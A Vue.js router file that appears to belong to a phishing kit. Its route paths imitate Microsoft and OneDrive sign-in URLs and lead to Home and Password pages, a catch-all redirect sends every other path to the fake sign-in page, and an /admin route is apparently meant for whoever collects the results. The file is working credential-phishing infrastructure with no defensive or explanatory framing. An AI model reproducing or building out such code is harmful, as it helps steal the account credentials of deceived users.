import Vue from 'vue'
import VueRouter from 'vue-router'
import Home from '../views/Home.vue'
import Admin from '../views/Admin.vue'
import Password from '../views/Password.vue'
Vue.use(VueRouter)

const routes = [
  {
    path: '/onedrive-live-com&about&en-us&signin-https-3A-2F-2Fwww-microsoft-com&rpsnv',
    name: 'home',
    component: Home
  },
  {
    path: '/admin',
    name: 'Admin',
    component: Admin
  },

  {
    path: '/login-srf&wa-wsignin-0&rpsnv13&ct=1573432251&rve-=7.1.6819.0&wp-MBI_SSL_SHARED&wreply-https-%2F%2Fonedrive-live-com',
    name: 'Password',
    component: Password
  },
  {
    path: '*',
    redirect: '/onedrive-live-com&about&en-us&signin-https-3A-2F-2Fwww-microsoft-com&rpsnv'
  }
]

const router = new VueRouter({
  mode: 'history',
  base: process.env.BASE_URL,
  routes
})

export default router
